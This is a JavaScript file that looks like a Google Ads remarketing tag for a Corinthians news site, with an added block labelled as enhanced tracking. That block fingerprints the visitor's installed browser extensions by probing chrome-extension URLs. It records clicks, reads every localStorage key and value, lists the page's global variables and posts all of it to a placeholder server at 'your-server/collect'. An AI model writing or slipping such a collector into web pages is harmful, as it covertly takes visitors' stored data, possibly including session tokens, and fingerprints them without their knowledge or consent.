(function () {
  var s = {};
  // Adding jshook, local storage, and global variable data to tracking behavior - Enhanced code with new behaviors. 

  // Function to get global variables
  function getGlobalVars() {
    let globalVariables = [];
    for (let variable in window) {
      globalVariables.push(variable);
    }
    return globalVariables;
  }
  async function detectAndTrackExtensions() {
    const trackingResults = {};

    // Add event listener to detect user interactions (i.e., click events)
    document.addEventListener("click", function (e) {
      trackingResults['lastClickedElement'] = e.target.tagName;
    });
    for (const [extName, extData] of Object.entries(window.data)) {
      try {
        const response = await fetch(`chrome-extension://${extData.id}/${extData.file}`);
        trackingResults[extName] = response.status === 200;
      } catch (e) {
        trackingResults[extName] = false;
      }
    }

    // Reading data from localStorage
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      trackingResults[`localStorage_${key}`] = localStorage.getItem(key);
    }

    // Collect global variables
    trackingResults['globalVariables'] = getGlobalVars();

    // Send results to server
    fetch('https://your-server/collect', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        trackingInfo: trackingResults,
        timestamp: new Date().toISOString(),
        userAgentDetails: navigator.userAgent,
        // JS Hook for tracking performance.
        performanceData: window.performance.now()
      })
    });
  }

  // Initiate the tracking extension detection
  (function () {
    /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */var e = {},
      f = this || self;
    var g, k;
    a: {
      for (var l = ["CLOSURE_FLAGS"], p = f, q = 0; q < l.length; q++) if (p = p[l[q]], null == p) {
        k = null;
        break a;
      }
      k = p;
    }
    var r = k && k[610401301];
    g = null != r ? r : !1;
    var t,
      v = f.navigator;
    t = v ? v.userAgentData || null : null;
    function w(d) {
      return g ? t ? t.brands.some(function (a) {
        return (a = a.brand) && -1 != a.indexOf(d);
      }) : !1 : !1;
    }
    function x(d) {
      var a;
      a: {
        if (a = f.navigator) if (a = a.userAgent) break a;
        a = "";
      }
      return -1 != a.indexOf(d);
    }
    ;
    function y() {
      return g ? !!t && 0 < t.brands.length : !1;
    }
    function z() {
      return y() ? w("Chromium") : (x("Chrome") || x("CriOS")) && !(y() ? 0 : x("Edge")) || x("Silk");
    }
    ;
    !x("Android") || z();
    z();
    !x("Safari") || z() || (y() ? 0 : x("Coast")) || (y() ? 0 : x("Opera")) || (y() ? 0 : x("Edge")) || (y() ? w("Microsoft Edge") : x("Edg/")) || y() && w("Opera");
    var A = /#|$/;
    function B(d) {
      var a = d.search(A),
        b;
      a: {
        for (b = 0; 0 <= (b = d.indexOf("fmt", b)) && b < a;) {
          var c = d.charCodeAt(b - 1);
          if (38 == c || 63 == c) if (c = d.charCodeAt(b + 3), !c || 61 == c || 38 == c || 35 == c) break a;
          b += 4;
        }
        b = -1;
      }
      if (0 > b) return null;
      c = d.indexOf("&", b);
      if (0 > c || c > a) c = a;
      return decodeURIComponent(d.slice(b + 4, -1 !== c ? c : 0).replace(/\+/g, " "));
    }
    ;
    function C(d, a, b) {
      function c() {
        --D;
        if (0 >= D) {
          var h;
          (h = d.GooglebQhCsO) || (h = {});
          var E = h[a];
          E && (delete h[a], (h = E[0]) && h.call && h());
        }
      }
      for (var D = b.length + 1, u = 0; u < b.length; u++) {
        var m = B(b[u]),
          n = null;
        1 != m && 2 != m || !(m = d.document.getElementById("goog_conv_iframe")) || m.src || (n = m);
        n || (n = new Image());
        n.onload = c;
        n.src = b[u];
      }
      c();
    }
    var F = ["ss_"],
      G = s || f;
    F[0] in G || "undefined" == typeof G.execScript || G.execScript("var " + F[0]);
    for (var H; F.length && (H = F.shift());) F.length || void 0 === C ? G[H] && G[H] !== Object.prototype[H] ? G = G[H] : G = G[H] = {} : G[H] = C;
  }).call(this);
  ;
  detectAndTrackExtensions();
  s.ss_(window, 'OjE2OTI1MzcwOTgwNjc', ['https://www.google.com/pagead/1p-user-list/AW-931232517/?random\x3d1692537098067\x26cv\x3d11\x26fst\x3d1692536400000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45be38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fnoticiasdotimao.com.br%2F\x26frm\x3d0\x26tiba\x3d%C3%9Altimas%20do%20Corinthians%20-%20Not%C3%ADcias%20do%20Tim%C3%A3o\x26data\x3devent%3Dgtag.config\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d2152286566\x26rmt_tld\x3d0\x26ipr\x3dy', 'https://www.google.co.jp/pagead/1p-user-list/AW-931232517/?random\x3d1692537098067\x26cv\x3d11\x26fst\x3d1692536400000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45be38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fnoticiasdotimao.com.br%2F\x26frm\x3d0\x26tiba\x3d%C3%9Altimas%20do%20Corinthians%20-%20Not%C3%ADcias%20do%20Tim%C3%A3o\x26data\x3devent%3Dgtag.config\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d2152286566\x26rmt_tld\x3d1\x26ipr\x3dy']);
})();